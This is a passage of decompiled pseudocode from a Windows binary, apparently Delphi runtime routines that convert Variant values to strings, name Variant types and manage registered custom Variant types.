      FUN_004047fc((int *)param_1,local_44);
    }
    else if ((uVar1 & 0x4000) == 0) {
      local_18 = (BSTR)&stack0xfffffffc;
      piVar2 = FUN_004047a8((int *)param_1);
      iVar3 = FUN_0040f1c8(param_2,piVar2);
      if ((char)iVar3 == '\0') {
        FUN_0040f098(param_2,(LPSTR *)&local_7c);
        FUN_004047fc((int *)param_1,local_7c);
      }
    }
    else {
      uVar4 = (undefined)(uVar1 - 0x101);
      switch(uVar1 & 0xbfff) {
      default:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040f098(param_2,(LPSTR *)&local_78);
        FUN_004047fc((int *)param_1,local_78);
        break;
      case 2:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040803c((int)**(short **)(param_2 + 4),(int *)&local_48);
        FUN_004047fc((int *)param_1,local_48);
        break;
      case 3:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040803c(**(uint **)(param_2 + 4),(int *)&local_4c);
        FUN_004047fc((int *)param_1,local_4c);
        break;
      case 4:
        local_30 = (undefined4 *)0x40f5ba;
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_004096a8((int *)&local_50,uVar4,0,SUB101((float10)**(float **)(param_2 + 4),0));
        FUN_004047fc((int *)param_1,local_50);
        break;
      case 5:
        local_30 = (undefined4 *)0x40f5dd;
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_004096a8((int *)&local_54,uVar4,0,SUB101((float10)**(double **)(param_2 + 4),0));
        FUN_004047fc((int *)param_1,local_54);
        break;
      case 6:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040ef64(&local_58,uVar4,0,**(undefined4 **)(param_2 + 4),
                     (*(undefined4 **)(param_2 + 4))[1]);
        FUN_00404a30(param_1,local_58);
        break;
      case 7:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040ef9c(&local_5c,uVar4,0,**(undefined4 **)(param_2 + 4),
                     (*(undefined4 **)(param_2 + 4))[1]);
        FUN_00404a30(param_1,local_5c);
        break;
      case 8:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_004049d0(param_1,**(LPCWSTR **)(param_2 + 4));
        break;
      case 0xb:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040efd4((uint)*(ushort **)(param_2 + 4) & 0xffff0000 | (uint)**(ushort **)(param_2 + 4)
                     ,&local_60);
        FUN_00404a30(param_1,local_60);
        break;
      case 0xc:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040f24c(param_1,*(ushort **)(param_2 + 4));
        break;
      case 0x10:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040803c((int)**(char **)(param_2 + 4),(int *)&local_64);
        FUN_004047fc((int *)param_1,local_64);
        break;
      case 0x11:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040803c((uint)**(byte **)(param_2 + 4),(int *)&local_68);
        FUN_004047fc((int *)param_1,local_68);
        break;
      case 0x12:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_0040803c((uint)**(ushort **)(param_2 + 4),(int *)&local_6c);
        FUN_004047fc((int *)param_1,local_6c);
        break;
      case 0x13:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_00408128((int *)&local_70,0,0,(char)**(undefined4 **)(param_2 + 4));
        FUN_004047fc((int *)param_1,local_70);
        break;
      case 0x14:
        local_18 = (BSTR)&stack0xfffffffc;
        FUN_00408128((int *)&local_74,uVar4,0,(char)**(undefined4 **)(param_2 + 4));
        FUN_004047fc((int *)param_1,local_74);
      }
    }
    break;
  case 0xb:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040efd4((uint)param_2[4],(BSTR *)&stack0xffffffd8);
    FUN_00404a30(param_1,in_stack_ffffffd8);
    break;
  case 0xc:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040f24c(param_1,*(ushort **)(param_2 + 4));
    break;
  case 0x10:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040803c((int)*(char *)(param_2 + 4),(int *)&stack0xffffffd4);
    FUN_004047fc((int *)param_1,in_stack_ffffffd4);
    break;
  case 0x11:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040803c((uint)*(byte *)(param_2 + 4),(int *)&local_30);
    FUN_004047fc((int *)param_1,local_30);
    break;
  case 0x12:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040803c((uint)param_2[4],(int *)&local_34);
    FUN_004047fc((int *)param_1,local_34);
    break;
  case 0x13:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_00408128((int *)&local_38,0,0,(char)*(undefined4 *)(param_2 + 4));
    FUN_004047fc((int *)param_1,local_38);
    break;
  case 0x14:
    FUN_00408128((int *)&local_3c,uVar4,0,(char)*(undefined4 *)(param_2 + 4));
    FUN_004047fc((int *)param_1,local_3c);
  }
  *in_FS_OFFSET = local_20;
  local_18 = (BSTR)&LAB_0040f78a;
  local_1c = L"䖍몤\x03";
  FUN_004047cc((int *)&local_7c,7);
  local_1c = L"䖍몰\v";
  FUN_00404e6c(&local_60,3);
  local_1c = L"䖍뫜\x05";
  FUN_004047cc((int *)&local_54,0xb);
  local_1c = L"䖍뫰\x04";
  FUN_00404e6c((BSTR *)&stack0xffffffd8,5);
  local_1c = (BSTR)0x40f782;
  FUN_004047cc((int *)&stack0xffffffec,4);
  return;
}



void FUN_0040f790(undefined2 *param_1,BSTR *param_2)

{
  DWORD DVar1;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  int *in_FS_OFFSET;
  int iStack56;
  undefined *puStack52;
  int iStack44;
  undefined *puStack40;
  undefined *puStack36;
  BSTR local_18;
  undefined local_14 [16];
  
  puStack36 = &stack0xfffffffc;
  local_18 = (BSTR)0x0;
  puStack40 = &LAB_0040f83a;
  iStack44 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int)&iStack44;
  puStack52 = (undefined *)0x40f7b8;
  VariantInit((VARIANTARG *)local_14);
  puStack52 = &LAB_0040f81d;
  iStack56 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int)&iStack56;
  DVar1 = (**(code **)PTR_DAT_0044154c)();
  FUN_0040e8ec(DVar1,CONCAT22(extraout_var_00,*param_1),CONCAT22(extraout_var,8));
  FUN_00404f64(&local_18,local_14._8_4_);
  FUN_00405050((uint)local_18,1,0x7fffffff,param_2);
  *in_FS_OFFSET = (int)local_14;
  FUN_0040ebf8((VARIANTARG *)local_14,local_14,(int *)0x400);
  return;
}



void FUN_0040f848(VARIANTARG *param_1,BSTR *param_2)

{
  int *extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY40;
  undefined *puStackY36;
  int *piVar1;
  VARIANTARG local_14;
  
  piVar1 = (int *)&stack0xfffffffc;
  puStackY36 = (undefined *)0x40f85d;
  VariantInit(&local_14);
  puStackY36 = &LAB_0040f89e;
  uStackY40 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY40;
  FUN_0040ef20(&local_14,param_1,extraout_ECX);
  (*DAT_00442810)(&local_14);
  FUN_0040f974(param_2,(ushort *)&local_14);
  *in_FS_OFFSET = uStackY40;
  puStackY36 = (undefined *)0x40f89d;
  FUN_0040ebf8(&local_14,uStackY40,piVar1);
  return;
}



void FUN_0040f8ac(ushort *param_1,BSTR *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  BSTR *ppOVar3;
  undefined4 uStack64;
  int *piStack60;
  undefined4 uStack52;
  undefined *puStack48;
  undefined *puStack44;
  BSTR local_24;
  undefined local_20 [16];
  int *local_10;
  char local_9;
  BSTR *local_8;
  
  puStack44 = &stack0xfffffffc;
  local_24 = (BSTR)0x0;
  if (param_2 != (BSTR *)0x0) {
    *param_2 = (BSTR)0x0;
  }
  puStack48 = &LAB_0040f964;
  uStack52 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack52;
  local_8 = param_2;
  iVar2 = FUN_004104b4((uint)*param_1,&local_10);
  local_9 = (char)iVar2;
  if (local_9 != '\0') {
    piStack60 = (int *)0x40f8f3;
    VariantInit((VARIANTARG *)local_20);
    piStack60 = (int *)&LAB_0040f947;
    uStack64 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack64;
    (**(code **)(*local_10 + 0x1c))(local_10,local_20,param_1);
    ppOVar3 = local_8;
    FUN_00404f64(&local_24,local_20._8_4_);
    FUN_00405050((uint)local_24,1,0x7fffffff,ppOVar3);
    piVar1 = piStack60;
    *in_FS_OFFSET = 8;
    piStack60 = (int *)0x40f94e;
    uStack64 = 0x40f946;
    FUN_0040ebf8((VARIANTARG *)local_20,8,piVar1);
    return;
  }
  *in_FS_OFFSET = uStack52;
  puStack44 = &LAB_0040f96b;
  puStack48 = (undefined *)0x40f963;
  FUN_00404e54(&local_24);
  return;
}



void FUN_0040f974(BSTR *param_1,ushort *param_2)

{
  ushort uVar1;
  char cVar2;
  BSTR *ppOVar3;
  undefined uVar4;
  LPCSTR unaff_EBX;
  OLECHAR *unaff_ESI;
  OLECHAR **in_FS_OFFSET;
  OLECHAR *local_78;
  OLECHAR *local_74;
  LPCSTR local_70;
  LPCSTR local_6c;
  LPCSTR local_68;
  LPCSTR local_64;
  LPCSTR local_60;
  OLECHAR *local_5c;
  OLECHAR *local_58;
  OLECHAR *local_54;
  LPCSTR local_50;
  LPCSTR local_4c;
  LPCSTR local_48;
  LPCSTR local_44;
  OLECHAR *local_40;
  OLECHAR *local_3c;
  LPCSTR local_38;
  LPCSTR local_34;
  LPCSTR in_stack_ffffffd0;
  LPCSTR in_stack_ffffffd4;
  undefined uVar5;
  undefined2 uVar6;
  OLECHAR *local_24;
  BSTR local_20;
  BSTR local_1c;
  LPCSTR local_10;
  LPCSTR local_c;
  LPCSTR local_8;
  
  local_1c = (BSTR)&stack0xfffffffc;
  local_10 = (LPCSTR)0xe;
  do {
    local_8 = (LPCSTR)0x0;
    local_10 = local_10 + -1;
  } while (local_10 != (LPCSTR)0x0);
  local_20 = L"שｃ\xebff庐譛工郃荦࠸ᩲ烿，ࡰ烿＄昰Ç";
  local_24 = *in_FS_OFFSET;
  *in_FS_OFFSET = (OLECHAR *)&local_24;
  uVar1 = *param_2;
  uVar4 = (undefined)uVar1;
  switch(uVar1) {
  case 0:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_00404e54(param_1);
    break;
  case 1:
    local_1c = (BSTR)&stack0xfffffffc;
    if (DAT_0043f33c != '\0') {
      local_1c = (BSTR)&stack0xfffffffc;
      FUN_0040e4ac(1,8);
    }
    FUN_00404fa0(param_1,DAT_0043f340);
    break;
  case 2:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040803c((int)(short)param_2[4],(int *)&local_8);
    FUN_00404fa0(param_1,local_8);
    break;
  case 3:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040803c(*(uint *)(param_2 + 4),(int *)&local_c);
    FUN_00404fa0(param_1,local_c);
    break;
  case 4:
    local_34 = (LPCSTR)0x40fa7d;
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_004096a8((int *)&local_10,uVar4,0,SUB101((float10)*(float *)(param_2 + 4),0));
    FUN_00404fa0(param_1,local_10);
    break;
  case 5:
    local_34 = (LPCSTR)0x40fa9e;
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_004096a8((int *)&stack0xffffffec,uVar4,0,SUB101((float10)*(double *)(param_2 + 4),0));
    FUN_00404fa0(param_1,unaff_EBX);
    break;
  case 6:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040ef64((BSTR *)&stack0xffffffe8,uVar4,0,*(undefined4 *)(param_2 + 4),
                 *(undefined4 *)(param_2 + 6));
    FUN_00404e90(param_1,unaff_ESI);
    break;
  case 7:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040ef9c(&local_1c,uVar4,0,*(undefined4 *)(param_2 + 4),*(undefined4 *)(param_2 + 6));
    FUN_00404e90(param_1,local_1c);
    break;
  case 8:
    uVar4 = SUB41(param_1,0);
    uVar5 = (undefined)((uint)param_1 >> 8);
    uVar6 = (undefined2)((uint)param_1 >> 0x10);
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_00404f64(&local_20,*(OLECHAR **)(param_2 + 4));
    FUN_00405050((uint)local_20,1,0x7fffffff,(BSTR *)CONCAT22(uVar6,CONCAT11(uVar5,uVar4)));
    break;
  case 9:
  case 0xd:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040f790(param_2,&local_3c);
    FUN_00404e90(param_1,local_3c);
    break;
  default:
    if (uVar1 == 0x100) {
      local_1c = (BSTR)&stack0xfffffffc;
      FUN_00404fa0(param_1,*(LPCSTR *)(param_2 + 4));
    }
    else if ((ushort)(uVar1 - 0x101) == 0) {
      local_1c = (BSTR)&stack0xfffffffc;
      FUN_0040f848((VARIANTARG *)param_2,&local_40);
      FUN_00404e90(param_1,local_40);
    }
    else if ((uVar1 & 0x4000) == 0) {
      local_1c = (BSTR)&stack0xfffffffc;
      ppOVar3 = FUN_00404e54(param_1);
      cVar2 = FUN_0040f8ac(param_2,ppOVar3);
      if (cVar2 == '\0') {
        FUN_0040f790(param_2,&local_78);
        FUN_00404e90(param_1,local_78);
      }
    }
    else {
      uVar4 = (undefined)(uVar1 - 0x101);
      switch(uVar1 & 0xbfff) {
      default:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040f790(param_2,&local_74);
        FUN_00404e90(param_1,local_74);
        break;
      case 2:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040803c((int)**(short **)(param_2 + 4),(int *)&local_44);
        FUN_00404fa0(param_1,local_44);
        break;
      case 3:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040803c(**(uint **)(param_2 + 4),(int *)&local_48);
        FUN_00404fa0(param_1,local_48);
        break;
      case 4:
        local_34 = (LPCSTR)0x40fcd6;
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_004096a8((int *)&local_4c,uVar4,0,SUB101((float10)**(float **)(param_2 + 4),0));
        FUN_00404fa0(param_1,local_4c);
        break;
      case 5:
        local_34 = (LPCSTR)0x40fcf9;
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_004096a8((int *)&local_50,uVar4,0,SUB101((float10)**(double **)(param_2 + 4),0));
        FUN_00404fa0(param_1,local_50);
        break;
      case 6:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040ef64(&local_54,uVar4,0,**(undefined4 **)(param_2 + 4),
                     (*(undefined4 **)(param_2 + 4))[1]);
        FUN_00404e90(param_1,local_54);
        break;
      case 7:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040ef9c(&local_58,uVar4,0,**(undefined4 **)(param_2 + 4),
                     (*(undefined4 **)(param_2 + 4))[1]);
        FUN_00404e90(param_1,local_58);
        break;
      case 8:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_00404f64(param_1,**(OLECHAR ***)(param_2 + 4));
        break;
      case 0xb:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040efd4((uint)*(ushort **)(param_2 + 4) & 0xffff0000 | (uint)**(ushort **)(param_2 + 4)
                     ,&local_5c);
        FUN_00404e90(param_1,local_5c);
        break;
      case 0xc:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040f974(param_1,*(ushort **)(param_2 + 4));
        break;
      case 0x10:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040803c((int)**(char **)(param_2 + 4),(int *)&local_60);
        FUN_00404fa0(param_1,local_60);
        break;
      case 0x11:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040803c((uint)**(byte **)(param_2 + 4),(int *)&local_64);
        FUN_00404fa0(param_1,local_64);
        break;
      case 0x12:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_0040803c((uint)**(ushort **)(param_2 + 4),(int *)&local_68);
        FUN_00404fa0(param_1,local_68);
        break;
      case 0x13:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_00408128((int *)&local_6c,0,0,(char)**(undefined4 **)(param_2 + 4));
        FUN_00404fa0(param_1,local_6c);
        break;
      case 0x14:
        local_1c = (BSTR)&stack0xfffffffc;
        FUN_00408128((int *)&local_70,uVar4,0,(char)**(undefined4 **)(param_2 + 4));
        FUN_00404fa0(param_1,local_70);
      }
    }
    break;
  case 0xb:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040efd4((uint)param_2[4],&local_24);
    FUN_00404e90(param_1,local_24);
    break;
  case 0xc:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040f974(param_1,*(ushort **)(param_2 + 4));
    break;
  case 0x10:
    uVar4 = 0x31;
    uVar5 = 0xfb;
    uVar6 = 0x40;
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040803c((int)*(char *)(param_2 + 4),(int *)&stack0xffffffd8);
    FUN_00404fa0(param_1,(LPCSTR)CONCAT22(uVar6,CONCAT11(uVar5,uVar4)));
    break;
  case 0x11:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040803c((uint)*(byte *)(param_2 + 4),(int *)&stack0xffffffd4);
    FUN_00404fa0(param_1,in_stack_ffffffd4);
    break;
  case 0x12:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_0040803c((uint)param_2[4],(int *)&stack0xffffffd0);
    FUN_00404fa0(param_1,in_stack_ffffffd0);
    break;
  case 0x13:
    local_1c = (BSTR)&stack0xfffffffc;
    FUN_00408128((int *)&local_34,0,0,(char)*(undefined4 *)(param_2 + 4));
    FUN_00404fa0(param_1,local_34);
    break;
  case 0x14:
    FUN_00408128((int *)&local_38,uVar4,0,(char)*(undefined4 *)(param_2 + 4));
    FUN_00404fa0(param_1,local_38);
  }
  *in_FS_OFFSET = local_24;
  local_1c = L"孞\xe58b썝暐㢃爈：౰烿（Ѱヿ읦";
  local_20 = L"䖍몔\x05";
  FUN_00404e6c(&local_78,2);
  local_20 = L"䖍모\x03";
  FUN_004047cc((int *)&local_70,5);
  local_20 = L"䖍몴\x04";
  FUN_00404e6c(&local_5c,3);
  local_20 = L"䖍뫄\x02";
  FUN_004047cc((int *)&local_50,4);
  local_20 = L"䖍뫌\x05";
  FUN_00404e6c(&local_40,2);
  local_20 = L"䖍뫠\x04";
  FUN_004047cc((int *)&local_38,5);
  local_20 = L"䖍뫰\x04";
  FUN_00404e6c(&local_24,4);
  local_20 = L"\xe9c3䌅\xffff郫孞\xe58b썝暐㢃爈：౰烿（Ѱヿ읦";
  FUN_004047cc((int *)&stack0xffffffec,4);
  return;
}



void FUN_00410058(uint param_1,int *param_2)

{
  int iVar1;
  ushort uVar2;
  undefined4 *in_FS_OFFSET;
  byte *pbVar4;
  undefined4 uStack548;
  undefined *puStack544;
  undefined *puStack540;
  undefined4 *local_20c;
  byte local_208 [256];
  byte local_108 [256];
  int *local_8;
  ushort uVar3;
  
  puStack540 = &stack0xfffffffc;
  local_20c = (undefined4 *)0x0;
  puStack544 = &LAB_0041017e;
  uStack548 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack548;
  uVar3 = (ushort)param_1;
  uVar2 = uVar3 & 0xfff;
  if (uVar2 < 0x15) {
    puStack540 = &stack0xfffffffc;
    FUN_004047fc(param_2,(undefined4 *)(&PTR_s_Empty_0043f34c)[uVar2]);
  }
  else if (uVar3 == 0x100) {
    puStack540 = &stack0xfffffffc;
    FUN_004047fc(param_2,(undefined4 *)"String");
  }
  else if (uVar3 == 0x101) {
    puStack540 = &stack0xfffffffc;
    FUN_004047fc(param_2,(undefined4 *)&DAT_004101a4);
  }
  else {
    iVar1 = FUN_004104b4(param_1,&local_8);
    if ((char)iVar1 == '\0') {
      FUN_00408150((uint)uVar2,4,(int *)&local_20c);
      FUN_00404ab4(param_2,*(undefined4 **)PTR_PTR_DAT_00441580,local_20c);
    }
    else {
      pbVar4 = local_108;
      FUN_00403a9c(*local_8,local_208);
      FUN_004027f8(local_208,2,0x7fffffff,pbVar4);
      FUN_00404a0c(param_2,local_108);
    }
  }
  if ((param_1 & 0x2000) != 0) {
    FUN_00404ab4(param_2,(undefined4 *)"Array ",(undefined4 *)*param_2);
  }
  if ((param_1 & 0x4000) != 0) {
    FUN_00404ab4(param_2,(undefined4 *)"ByRef ",(undefined4 *)*param_2);
  }
  *in_FS_OFFSET = uStack548;
  puStack540 = &LAB_00410185;
  puStack544 = (undefined *)0x41017d;
  FUN_004047a8((int *)&local_20c);
  return;
}



void FUN_004101c8(VARIANTARG *param_1,undefined4 param_2,int *param_3)

{
  FUN_0040ebf8(param_1,param_2,param_3);
  *(undefined2 *)&param_1->n1 = 10;
  *(undefined4 *)&(param_1->n1).field_0x8 = param_2;
  return;
}



void FUN_004101e0(VARIANTARG *param_1,undefined4 param_2,int *param_3)

{
  FUN_004101c8(param_1,0x80020004,param_3);
  return;
}



void FUN_00410210(void)

{
  int *piVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY24;
  
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00442820);
  uStackY24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY24;
  iVar2 = FUN_0040578c(DAT_0044281c);
  iVar2 = iVar2 + -1;
  if (-1 < iVar2) {
    do {
      piVar1 = *(int **)(DAT_0044281c + iVar2 * 4);
      if (piVar1 != DAT_0043f348) {
        FUN_00403b24(piVar1);
      }
      iVar2 = iVar2 + -1;
    } while (iVar2 != -1);
  }
  *in_FS_OFFSET = uStackY24;
  uStackY24 = 0x410270;
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00442820);
  return;
}



void FUN_00410288(uint param_1,undefined4 param_2,int *param_3)

{
  uint uVar1;
  int *local_10;
  
  local_10 = param_3;
  uVar1 = FUN_004104b4(param_1 & 0xffff0000 | (uint)*(ushort *)param_3,&local_10);
  if ((char)uVar1 == '\0') {
    FUN_00410434();
  }
  else {
    (**(code **)(*local_10 + 0x1c))
              (local_10,param_2,param_3,uVar1 & 0xffff0000 | (uint)*(ushort *)(param_1 + 4));
  }
  return;
}



void FUN_004102c0(uint param_1,undefined4 param_2,ushort *param_3,undefined4 param_4)

{
  int iVar1;
  int *local_c;
  undefined4 local_8;
  
  local_8 = param_2;
  if (((short)param_4 != *(short *)(param_1 + 4)) &&
     (iVar1 = FUN_004104b4(param_1 & 0xffff0000 | (uint)*param_3,&local_c), (char)iVar1 != '\0')) {
    (**(code **)(*local_c + 0x1c))(local_c,local_8,param_3,param_4);
    return;
  }
  FUN_00410434();
  return;
}



void FUN_00410308(void)

{
  FUN_0041043c();
  return;
}



undefined FUN_00410314(int *param_1,undefined4 param_2,uint param_3,int param_4)

{
  undefined4 uStack8;
  
  uStack8 = param_3;
  (**(code **)(*param_1 + 0x38))(param_1,param_2,param_3,(int)&uStack8 + 3);
  return *(undefined *)(param_4 * 3 + 0x43f376 + (uStack8 >> 0x18));
}



undefined4 FUN_00410418(int param_1,undefined4 param_2,undefined4 param_3,undefined2 *param_4)

{
  undefined2 uVar1;
  
  uVar1 = *(undefined2 *)(param_1 + 4);
  *param_4 = uVar1;
  return CONCAT31((uint3)((uint)param_1 >> 8) & 0xffff00 | (uint3)(byte)((ushort)uVar1 >> 8),1);
}



void FUN_00410434(void)

{
  FUN_0040e458();
  return;
}



void FUN_0041043c(void)

{
  FUN_0040e548();
  return;
}



void FUN_00410444(void)

{
  FUN_0040e920();
  return;
}



undefined4 FUN_00410474(void)

{
  return 0xffffffff;
}



int FUN_004104b4(uint param_1,undefined4 *param_2)

{
  bool bVar1;
  uint3 uVar3;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY32;
  
  if (((DAT_0044281c == 0) || ((ushort)param_1 < 0x100)) || (0x7ff < (ushort)param_1)) {
    bVar1 = false;
    uVar3 = 0;
  }
  else {
    uVar3 = (uint3)(param_1 >> 8);
    bVar1 = true;
  }
  if (bVar1) {
    EnterCriticalSection((LPCRITICAL_SECTION)&DAT_00442820);
    uStackY32 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStackY32;
    iVar2 = FUN_0040578c(DAT_0044281c);
    if ((int)((param_1 & 0xffff) - 0x100) < iVar2) {
      *param_2 = *(undefined4 *)(DAT_0044281c + -0x400 + (param_1 & 0xffff) * 4);
    }
    iVar2 = 0;
    *in_FS_OFFSET = uStackY32;
    uStackY32 = 0x41055b;
    LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_00442820);
    return iVar2;
  }
  return (uint)uVar3 << 8;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041056c(void)

{
  int *extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack16;
  undefined *puStack12;
  undefined *puStack8;
  
  puStack8 = &stack0xfffffffc;
  puStack12 = &DAT_004105db;
  uStack16 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack16;
  _DAT_00442818 = _DAT_00442818 + 1;
  if (_DAT_00442818 == 0) {
    FUN_00410210();
    DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_00442820);
    FUN_00405a48(&DAT_0044281c,(int)&DAT_004101f0);
    FUN_0040521c((int **)&PTR_s_Empty_0043f34c,&DAT_00401034,0x15);
    FUN_004047a8(&DAT_0043f340);
    FUN_0040ec0c((VARIANTARG *)&DAT_004427f8,extraout_EDX,extraout_ECX);
  }
  *in_FS_OFFSET = uStack16;
  return;
}



void FUN_0041142c(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 *param_4,
                 undefined4 param_5)

{
  FUN_004068c0(param_1,param_2,param_3,param_4,param_5);
  return;
}



int * FUN_00411504(int *param_1,char param_2,int param_3)

{
  int iVar1;
  int *piVar2;
  int extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffdc;
  undefined4 in_stack_ffffffe0;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffdc,in_stack_ffffffe0,
                                  in_stack_ffffffe4,in_stack_ffffffe8);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403af4(param_1,'\0',param_3);
  iVar1 = FUN_00403af4((int *)&LAB_00410ca8,'\x01',extraout_ECX_00);
  param_1[1] = iVar1;
  iVar1 = FUN_00403af4((int *)&DAT_00411070,'\x01',extraout_ECX_01);
  param_1[2] = iVar1;
  piVar2 = (int *)FUN_00403af4((int *)&LAB_00410ca8,'\x01',extraout_ECX_02);
  param_1[3] = (int)piVar2;
  FUN_00411968(piVar2,param_3);
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffdc;
  }
  return param_1;
}



undefined4 FUN_004115c0(LPCVOID param_1,PVOID param_2)

{
  if (param_2 != (PVOID)0x0) {
    param_1 = FUN_00405ab8(param_1);
    if (param_2 != param_1) {
      return 0;
    }
  }
  return CONCAT31((int3)((uint)param_1 >> 8),1);
}



void FUN_004115e0(int param_1,PVOID param_2)

{
  LPCVOID pvVar1;
  undefined4 uVar2;
  int iVar3;
  
  iVar3 = *(int *)(*(int *)(param_1 + 0xc) + 8) + -1;
  if (-1 < iVar3) {
    do {
      pvVar1 = (LPCVOID)FUN_00411aa4(*(undefined4 **)(param_1 + 0xc),iVar3);
      uVar2 = FUN_004115c0(pvVar1,param_2);
      if ((char)uVar2 != '\0') {
        FUN_004119b4(*(int **)(param_1 + 0xc),iVar3);
      }
      iVar3 = iVar3 + -1;
    } while (iVar3 != -1);
  }
  iVar3 = *(int *)(*(int *)(param_1 + 4) + 8) + -1;
  if (-1 < iVar3) {
    do {
      pvVar1 = (LPCVOID)FUN_00411aa4(*(undefined4 **)(param_1 + 4),iVar3);
      uVar2 = FUN_004115c0(pvVar1,param_2);
      if ((char)uVar2 != '\0') {
        FUN_004119b4(*(int **)(param_1 + 4),iVar3);
      }
      iVar3 = iVar3 + -1;
    } while (iVar3 != -1);
  }
  iVar3 = (**(code **)(**(int **)(param_1 + 8) + 0x14))();
  iVar3 = iVar3 + -1;
  if (-1 < iVar3) {
    do {
      pvVar1 = (LPCVOID)(**(code **)(**(int **)(param_1 + 8) + 0x18))(*(int **)(param_1 + 8),iVar3);
      uVar2 = FUN_004115c0(pvVar1,param_2);
      if ((char)uVar2 != '\0') {
        (**(code **)(**(int **)(param_1 + 8) + 0x48))(*(int **)(param_1 + 8),iVar3);
      }
      iVar3 = iVar3 + -1;
    } while (iVar3 != -1);
  }
  return;
}



int * FUN_00411684(int *param_1,char param_2,undefined4 param_3)

{
  int iVar1;
  int *piVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403af4(param_1,'\0',param_3);
  iVar1 = FUN_00403af4((int *)&LAB_00410ca8,'\x01',extraout_ECX_00);
  param_1[1] = iVar1;
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 2));
  piVar2 = FUN_00411504((int *)&DAT_004114a0,'\x01',(int)&DAT_00410d64);
  FUN_00411968((int *)param_1[1],(int)piVar2);
  *(undefined *)(piVar2 + 4) = 1;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
